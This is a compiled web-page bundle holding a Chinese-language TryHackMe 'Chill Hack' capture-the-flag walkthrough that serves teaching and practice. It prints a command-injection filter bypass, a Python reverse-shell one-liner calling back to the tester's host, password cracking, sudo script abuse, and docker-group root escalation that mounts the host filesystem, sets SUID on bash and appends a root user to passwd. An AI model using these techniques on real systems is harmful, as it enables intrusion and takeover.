"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8550],{54224:(n,e,a)=>{a.r(e),a.d(e,{assets:()=>l,contentTitle:()=>r,default:()=>h,frontMatter:()=>o,metadata:()=>i,toc:()=>d});var s=a(74848),t=a(28453);const o={sidebar_position:21,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u547d\u4ee4\u6ce8\u5165","\u6587\u4ef6\u9690\u5199","docker"],title:"Chill Hack",description:"Chill Hack",sidebar_label:"Chill Hack",slug:"/tryhackme/21"},r="Chill Hack",i={id:"box/TryHackMe/21",title:"Chill Hack",description:"Chill Hack",source:"@site/docs/box/TryHackMe/21.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/21",permalink:"/docs/tryhackme/21",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"\u547d\u4ee4\u6ce8\u5165",permalink:"/docs/tags/\u547d\u4ee4\u6ce8\u5165"},{label:"\u6587\u4ef6\u9690\u5199",permalink:"/docs/tags/\u6587\u4ef6\u9690\u5199"},{label:"docker",permalink:"/docs/tags/docker"}],version:"current",sidebarPosition:21,frontMatter:{sidebar_position:21,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u547d\u4ee4\u6ce8\u5165","\u6587\u4ef6\u9690\u5199","docker"],title:"Chill Hack",description:"Chill Hack",sidebar_label:"Chill Hack",slug:"/tryhackme/21"},sidebar:"boxSidebar",previous:{title:"Lian_Yu",permalink:"/docs/tryhackme/20"},next:{title:"ToolsRus",permalink:"/docs/tryhackme/22"}},l={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"21 - FTP",id:"21---ftp",level:2},{value:"80 - HTTP",id:"80---http",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data --&gt; anurodh",id:"www-data----anurodh",level:3},{value:"anurodh --&gt; apaar",id:"anurodh----apaar",level:3},{value:"anurodh --&gt; root",id:"anurodh----root",level:3},{value:"\u6302\u8f7d\u8fd9\u4e2a\u7cfb\u7edf (\u8fd9\u4e2a\u662f\u6700\u5e38\u7528\u7684)",id:"\u6302\u8f7d\u8fd9\u4e2a\u7cfb\u7edf-\u8fd9\u4e2a\u662f\u6700\u5e38\u7528\u7684",level:4},{value:"\u6dfb\u52a0\u4e00\u4e2a root \u7528\u6237",id:"\u6dfb\u52a0\u4e00\u4e2a-root-\u7528\u6237",level:4},{value:"\u6dfb\u52a0 SUID \u6743\u9650",id:"\u6dfb\u52a0-suid-\u6743\u9650",level:4},{value:"\u4fee\u6539 sudoers \u6587\u4ef6\uff0c\u8ba9\u7528\u6237\u53ef\u4ee5\u6267\u884c\u6240\u6709\u7279\u6743\u547d\u4ee4",id:"\u4fee\u6539-sudoers-\u6587\u4ef6\u8ba9\u7528\u6237\u53ef\u4ee5\u6267\u884c\u6240\u6709\u7279\u6743\u547d\u4ee4",level:4}];function c(n){const e={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.h1,{id:"chill-hack",children:"Chill Hack"}),"\n",(0,s.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(jtz\u327fJTZ)-[~/Desktop/Temp/thm/Chill_Hack]\n\u2514\u2500$  nmap -sT -p- --min-rate 1000 -oN nmap1.txt 10.10.228.115\n  PORT      STATE    SERVICE\n  21/tcp    open     ftp\n  22/tcp    open     ssh\n  80/tcp    open     http\n  51578/tcp filtered unknown\n\u250c\u2500\u2500(jtz\u327fJTZ)-[~/Desktop/Temp/thm/Chill_Hack]\n\u2514\u2500$  nmap -sTCV -p 21,22,80 --min-rate 1000 -oN nmap2.txt 10.10.228.115\n  PORT   STATE SERVICE VERSION\n  21/tcp open  ftp     vsftpd 3.0.3\n  | ftp-anon: Anonymous FTP login allowed (FTP code 230)\n  |_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt\n  | ftp-syst:\n  |   STAT:\n  | FTP server status:\n  |      Connected to ::ffff:10.14.44.131\n  |      Logged in as ftp\n  |      TYPE: ASCII\n  |      No session bandwidth limit\n  |      Session timeout in seconds is 300\n  |      Control connection is plain text\n  |      Data connections will be plain text\n  |      At session startup, client count was 2\n  |      vsFTPd 3.0.3 - secure, fast, stable\n  |_End of status\n  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n  | ssh-hostkey:\n  |   2048 09f95db918d0b23a822d6e768cc20144 (RSA)\n  |   256 1bcf3a498b1b20b02c6aa551a88f1e62 (ECDSA)\n  |_  256 3005cc52c66f6504860f7241c8a439cf (ED25519)\n  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n  |_http-title: Game Info\n  |_http-server-header: Apache/2.4.29 (Ubuntu)\n  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,s.jsx)(e.h2,{id:"21---ftp",children:"21 - FTP"}),"\n",(0,s.jsx)(e.p,{children:"\u53d1\u73b0 FTP \u4e2d\u6709\u4e00\u4e2a note.txt \u6211\u4eec\u8fdb\u884c\u67e5\u770b"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(jtz\u327fJTZ)-[~/Desktop/Temp/thm/Chill_Hack]\n\u2514\u2500$ ftp 10.10.51.62\nConnected to 10.10.51.62.\n220 (vsFTPd 3.0.3)\nName (10.10.51.62:kali): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        115          4096 Oct 03  2020 .\ndrwxr-xr-x    2 0        115          4096 Oct 03  2020 ..\n-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt\n226 Directory send OK.\nftp> get note.txt -\nremote: note.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for note.txt (90 bytes).\nAnurodh told me that there is some filtering on strings being put in the command -- Apaar\n226 Transfer complete.\n90 bytes received in 0.00 secs (62.4667 kB/s)\n"})}),"\n",(0,s.jsx)(e.h2,{id:"80---http",children:"80 - HTTP"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240531225503.png",alt:"20240531225503"})}),"\n",(0,s.jsx)(e.p,{children:"\u6839\u636e FTP \u7684\u63d0\u793a\u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(jtz\u327fJTZ)-[~/Desktop/Temp/thm/Chill_Hack]\n\u2514\u2500$ gobuster dir -u http://10.10.228.115/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 150 -o gobuster_80_1.txt\n  /images               (Status: 301) [Size: 315] [--\x3e http://10.10.228.115/images/]\n  /css                  (Status: 301) [Size: 312] [--\x3e http://10.10.228.115/css/]\n  /js                   (Status: 301) [Size: 311] [--\x3e http://10.10.228.115/js/]\n  /fonts                (Status: 301) [Size: 314] [--\x3e http://10.10.228.115/fonts/]\n  /secret               (Status: 301) [Size: 315] [--\x3e http://10.10.228.115/secret/]\n"})}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.code,{children:"/secret"})," :  \u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\u53d1\u73b0\u662f\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u9875\u9762\uff0c\u7b80\u5355\u7684\u6267\u884c\u540e\u53d1\u73b0\u786e\u5b9e\u5b58\u5728\u8fc7\u6ee4\uff0c\u4f46\u662f\u6211\u53d1\u73b0\u53ef\u4ee5\u5229\u7528 && \u7ed5\u8fc7 (\u683c\u5f0f: id&& command)"]}),"\n"]})}),"\n",(0,s.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(e.h3,{id:"www-data",children:"www-data"}),"\n",(0,s.jsx)(e.p,{children:"\u56e0\u4e3a\u76ee\u6807\u5b58\u5728 python \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u65b9\u6765\u83b7\u53d6 SHELL"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'id&&python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.44.131",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'\n'})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"PS C:\\Users\\14894\\Desktop> nc.exe -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.14.44.131] from (UNKNOWN) [10.10.228.115] 58688\nwww-data@ubuntu:/var/www/html/secret$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n"})}),"\n",(0,s.jsx)(e.h3,{id:"www-data----anurodh",children:"www-data --\x3e anurodh"}),"\n",(0,s.jsx)(e.p,{children:"\u8fd9\u91cc\u662f\u67e5\u770b\u4e86 WP \u540e\u624d\u610f\u8bc6\u5230\u7684\uff0c\u56e0\u4e3a\u6211\u5728\u7b2c\u4e00\u6b21\u6253\u7684\u65f6\u5019\u76f4\u63a5\u8df3\u8fc7\u4e86\u8fd9\u4e00\u6b65\uff0c\u6bd5\u7adf\u8fd9\u4e2a\u786e\u5b9e\u6bd4\u8f83\u9690\u853d"}),"\n",(0,s.jsx)(e.p,{children:"\u6211\u4eec\u53ef\u4ee5\u5728\u7f51\u7ad9\u4e2d\u53d1\u73b0\u4e00\u4e2a files \u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5b58\u5728\u4e00\u4e2a hacker.php \u6587\u4ef6\uff0c\u6211\u4eec\u5bf9\u5176\u8fdb\u884c\u67e5\u770b"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"www-data@ubuntu:/var/www/files$ ls\nls\naccount.php  hacker.php  images  index.php  style.css\n"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-html",children:'<html>\n<head>\n<body>\n<style>\nbody {\n  background-image: url(\'images/002d7e638fb463fb7a266f5ffc7ac47d.gif\');\n}\nh2\n{\n        color:red;\n        font-weight: bold;\n}\nh1\n{\n        color: yellow;\n        font-weight: bold;\n}\n</style>\n<center>\n        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>\n        <h1 style="background-color:red;">You have reached this far. </h2>\n        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>\n</center>\n</head>\n</html>\n'})}),"\n",(0,s.jsx)(e.admonition,{type:"tip",children:(0,s.jsx)(e.p,{children:"\u8fd9\u5176\u4e2d\u5b58\u5728\u4e00\u4e2a jpg \u6587\u4ef6\uff0c\u5e76\u4e14\u63d0\u793a\u4e5f\u65e9\u544a\u8bc9\u6211\u4eec\u8fd9\u662f\u6b63\u786e\u7684, \u53ef\u80fd\u662f\u6587\u4ef6\u9690\u5199\u672f"})}),"\n",(0,s.jsx)(e.p,{children:"\u4e0b\u8f7d\u6587\u4ef6\u5230\u672c\u5730\u8fdb\u884c\u67e5\u770b, \u8fd9\u8fb9\u53ef\u4ee5\u770b\u5230\u786e\u5b9e\u5b58\u5728\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'\u250c\u2500\u2500(jtz\u327fJTZ)-[~/Desktop/Temp/thm/Chill_Hack]\n\u2514\u2500$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg\nEnter passphrase:\nwrote extracted data to "backup.zip".\n'})}),"\n",(0,s.jsx)(e.p,{children:"zip \u6587\u4ef6\u5b58\u5728\u5bc6\u7801\u6211\u4eec\u4f7f\u7528\u5de5\u5177\u8fdb\u884c\u7206\u7834"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(jtz\u327fJTZ)-[~/Desktop/Temp/thm/Chill_Hack]\n\u2514\u2500$ zip2john backup.zip > zip.hash\nver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8\n\u250c\u2500\u2500(jtz\u327fJTZ)-[~/Desktop/Temp/thm/Chill_Hack]\n\u2514\u2500$ john zip.hash  --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\npass1word        (backup.zip/source_code.php)\n1g 0:00:00:00 DONE (2023-02-15 11:40) 5.555g/s 91022p/s 91022c/s 91022C/s 123456..christal\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u67e5\u770b\u538b\u7f29\u6587\u4ef6"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'\u250c\u2500\u2500(jtz\u327fJTZ)-[~/Desktop/Temp/thm/Chill_Hack]\n\u2514\u2500$ unzip backup.zip\nArchive:  backup.zip\n[backup.zip] source_code.php password:\n  inflating: source_code.php\n\n\u250c\u2500\u2500(jtz\u327fJTZ)-[~/Desktop/Temp/thm/Chill_Hack]\n\u2514\u2500$ cat source_code.php\n<html>\n<head>\n        Admin Portal\n</head>\n        <title> Site Under Development ... </title>\n        <body>\n                <form method="POST">\n                        Username: <input type="text" name="name" placeholder="username"><br><br>\n                        Email: <input type="email" name="email" placeholder="email"><br><br>\n                        Password: <input type="password" name="password" placeholder="password">\n                        <input type="submit" name="submit" value="Submit">\n                </form>\n<?php\n        if(isset($_POST[\'submit\']))\n        {\n                $email = $_POST["email"];\n                $password = $_POST["password"];\n                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")\n                {\n                        $random = rand(1000,9999);?><br><br><br>\n                        <form method="POST">\n                                Enter the OTP: <input type="number" name="otp">\n                                <input type="submit" name="submitOtp" value="Submit">\n                        </form>\n                <?php   mail($email,"OTP for authentication",$random);\n                        if(isset($_POST["submitOtp"]))\n                                {\n                                        $otp = $_POST["otp"];\n                                        if($otp == $random)\n                                        {\n                                                echo "Welcome Anurodh!";\n                                                header("Location: authenticated.php");\n                                        }\n                                        else\n                                        {\n                                                echo "Invalid OTP";\n                                        }\n                                }\n                }\n                else\n                {\n                        echo "Invalid Username or Password";\n                }\n        }\n?>\n</html>\n'})}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u5bc6\u7801\uff1aIWQwbnRLbjB3bVlwQHNzdzByZA== \u89e3\u5bc6\uff1a!d0ntKn0wmYp@ssw0rd"}),"\n",(0,s.jsx)(e.li,{children:"\u7528\u6237\uff1a Anurodh"}),"\n"]})}),"\n",(0,s.jsx)(e.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u7528\u6237\u8fdb\u884c\u767b\u9646"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"www-data@ubuntu:/home/apaar/.ssh$ su anurodh\nsu anurodh\nPassword: !d0ntKn0wmYp@ssw0rd\n\nanurodh@ubuntu:/home/apaar/.ssh$ id\nid\nuid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u5f53\u524d\u7528\u6237\u5c5e\u4e8e docker \u7ec4\u4e2d\u4e00\u5458\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 docker \u65b9\u6cd5\u76f4\u63a5\u8d8a\u6743\u83b7\u53d6\u5230 root \uff0c\u53ef\u4ee5\u8bf4\u8fd9\u4e2a\u7528\u6237\u7684 SHELL \u5c31\u662f\u8fd9\u4e00\u5173\u7684\u5173\u952e\u67a2\u7ebd\uff0c\u53ea\u8981\u62ff\u4e0b\u8fd9\u4e2a\u7528\u6237\u8fd9\u4e00\u5173\u5c31\u7834\u89e3\u4e86"}),"\n",(0,s.jsx)(e.h3,{id:"anurodh----apaar",children:"anurodh --\x3e apaar"}),"\n",(0,s.jsx)(e.admonition,{type:"info",children:(0,s.jsx)(e.p,{children:"apaar \u7528\u6237\u7684\u4f1a\u8bdd\u975e\u5e38\u597d\u7a83\u53d6\uff0c\u4f46\u662f\u6b63\u662f\u56e0\u4e3a\u975e\u5e38\u597d\u83b7\u53d6\u5bfc\u81f4\u6211\u4eec\u6ca1\u6709\u601d\u8def\u518d\u53bb\u83b7\u53d6 Anurodh \u8fd9\u4e2a\u7528\u6237"})}),"\n",(0,s.jsx)(e.p,{children:"\u6211\u4eec\u5148\u6765\u56de\u5230 www-data \u4f1a\u8bdd\uff0c\u67e5\u770b\u5176\u7279\u6743"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"www-data@ubuntu:/home/apaar/.ssh$ sudo -l\nsudo -l\nMatching Defaults entries for www-data on ubuntu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on ubuntu:\n    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh\n"})}),"\n",(0,s.jsx)(e.p,{children:"www-data \u5141\u8bb8\u7528\u6237\u4ee5 apaar \u7684\u8eab\u4efd\u53bb\u8fd0\u884c\u4e00\u4e2a\u811a\u672c\uff0c\u6211\u4eec\u5bf9\u8be5\u811a\u672c\u67e5\u770b"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'#!/bin/bash\n\necho\necho "Welcome to helpdesk. Feel free to talk to anyone at any time!"\necho\n\nread -p "Enter the person whom you want to talk with: " person\n\nread -p "Hello user! I am $person,  Please enter your message: " msg\n\n$msg 2>/dev/null\n\necho "Thank you for your precious time!"\n'})}),"\n",(0,s.jsx)(e.p,{children:"\u6211\u4eec\u5bf9\u5176\u8fd0\u884c\u67e5\u770b"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"www-data@ubuntu:/home/apaar$ sudo -u apaar ./.helpline.sh\nsudo -u apaar ./.helpline.sh\n\nWelcome to helpdesk. Feel free to talk to anyone at any time!\n\nEnter the person whom you want to talk with: niubi\nniubi\nHello user! I am niubi,  Please enter your message: id\nid\nuid=1001(apaar) gid=1001(apaar) groups=1001(apaar)\nThank you for your precious time!\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4ee5 apaar \u7528\u6237\u6267\u884c\u4e86\u547d\u4ee4\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fdd\u6301\u4f1a\u8bdd\u6765\u83b7\u5f97 apaar \u7528\u6237\u4f1a\u8bdd"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"www-data@ubuntu:/home/apaar$ sudo -u apaar ./.helpline.sh\nsudo -u apaar ./.helpline.sh\n\nWelcome to helpdesk. Feel free to talk to anyone at any time!\n\nEnter the person whom you want to talk with: niubi\nniubi\nHello user! I am niubi,  Please enter your message: bash -p\nbash -p\nid\nid\nuid=1001(apaar) gid=1001(apaar) groups=1001(apaar)\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\napaar@ubuntu:~$\n"})}),"\n",(0,s.jsx)(e.h3,{id:"anurodh----root",children:"anurodh --\x3e root"}),"\n",(0,s.jsx)(e.p,{children:"\u56e0\u4e3a\u6211\u4eec\u5df2\u7ecf\u6ce8\u610f\u5230\u7528\u6237\u662f\u4e00\u4e2a docker \u7ec4\u7528\u6237\uff0c\u63d0\u6743\u601d\u8def\u5982\u4e0b\uff1a"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u6dfb\u52a0\u4e00\u4e2a root \u7528\u6237"}),"\n",(0,s.jsx)(e.li,{children:"\u4fee\u6539 sudoers \u6587\u4ef6\uff0c\u8ba9\u7528\u6237\u53ef\u4ee5\u6267\u884c\u6240\u6709\u7279\u6743\u547d\u4ee4"}),"\n",(0,s.jsx)(e.li,{children:"\u6dfb\u52a0 SUID \u6743\u9650"}),"\n",(0,s.jsx)(e.li,{children:"\u6302\u8f7d\u8fd9\u4e2a\u7cfb\u7edf"}),"\n"]}),"\n",(0,s.jsx)(e.h4,{id:"\u6302\u8f7d\u8fd9\u4e2a\u7cfb\u7edf-\u8fd9\u4e2a\u662f\u6700\u5e38\u7528\u7684",children:"\u6302\u8f7d\u8fd9\u4e2a\u7cfb\u7edf (\u8fd9\u4e2a\u662f\u6700\u5e38\u7528\u7684)"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"anurodh@ubuntu:/etc$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n# id\nuid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)\n#\n"})}),"\n",(0,s.jsx)(e.h4,{id:"\u6dfb\u52a0\u4e00\u4e2a-root-\u7528\u6237",children:"\u6dfb\u52a0\u4e00\u4e2a root \u7528\u6237"}),"\n",(0,s.jsx)(e.p,{children:"\u8fd9\u4e2a\u672c\u8d28\u4e5f\u662f\u6302\u8f7d\uff0c \u6302\u8f7d /etc \u76ee\u5f55\uff0c\u7136\u540e\u8bfb\u53d6 shadow \u6587\u4ef6"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u83b7\u53d6\u5230 root \u5bc6\u7801\u8fdb\u884c\u7834\u89e3\uff0c \u4f46\u662f\u672c\u5173 root hash \u7206\u7834\u4e0d\u4e86"}),"\n",(0,s.jsx)(e.li,{children:"\u6dfb\u52a0\u4e00\u4e2a root \u7528\u6237"}),"\n"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"anurodh@ubuntu:/home$ docker run -v /etc/:/mnt -it alpine\n/ # cd /mnt\n/mnt # cat shadow\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u751f\u6210\u7528\u6237\u7684 hash"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(jtz\u327fJTZ)-[~]\n\u2514\u2500$ openssl passwd -1 -salt test-docker\nPassword:\n"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"/mnt # echo 'test-docker:hash:0:0::/root:/bin/bash' >>passwd\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u73b0\u5728\u6211\u4eec\u5207\u6362\u7528\u6237\u5230 test-docker \u5e76\u8f93\u5165\u81ea\u5df1\u7684 hash  \u5bc6\u7801\u5c31\u53ef\u4ee5\u4e86"}),"\n",(0,s.jsx)(e.h4,{id:"\u6dfb\u52a0-suid-\u6743\u9650",children:"\u6dfb\u52a0 SUID \u6743\u9650"}),"\n",(0,s.jsx)(e.p,{children:"\u8fd9\u4e2a\u672c\u8d28\u4e5f\u662f\u6302\u8f7d\uff0c \u6302\u8f7d /bin \u76ee\u5f55\uff0c\u7136\u540e\u4fee\u6539 bash"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"anurodh@ubuntu:/home$ docker run -v /bin/:/mnt -it alpine\n/ # cd /mnt\n/mnt # chmod +s bash\n/mnt # ls -al bash\n-rwsr-sr-x    1 root     root       1113504 Jun  6  2019 bash\n/mnt # exit\nanurodh@ubuntu:/home$ cd /bin\nanurodh@ubuntu:/bin$ ./bash -p\nbash-4.4# id\nuid=1002(anurodh) gid=1002(anurodh) euid=0(root) egid=0(root) groups=0(root),999(docker),1002(anurodh)\nbash-4.4#\n"})}),"\n",(0,s.jsx)(e.h4,{id:"\u4fee\u6539-sudoers-\u6587\u4ef6\u8ba9\u7528\u6237\u53ef\u4ee5\u6267\u884c\u6240\u6709\u7279\u6743\u547d\u4ee4",children:"\u4fee\u6539 sudoers \u6587\u4ef6\uff0c\u8ba9\u7528\u6237\u53ef\u4ee5\u6267\u884c\u6240\u6709\u7279\u6743\u547d\u4ee4"})]})}function h(n={}){const{wrapper:e}={...(0,t.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(c,{...n})}):c(n)}},28453:(n,e,a)=>{a.d(e,{R:()=>r,x:()=>i});var s=a(96540);const t={},o=s.createContext(t);function r(n){const e=s.useContext(o);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function i(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:r(n.components),s.createElement(o.Provider,{value:e},n.children)}}}]);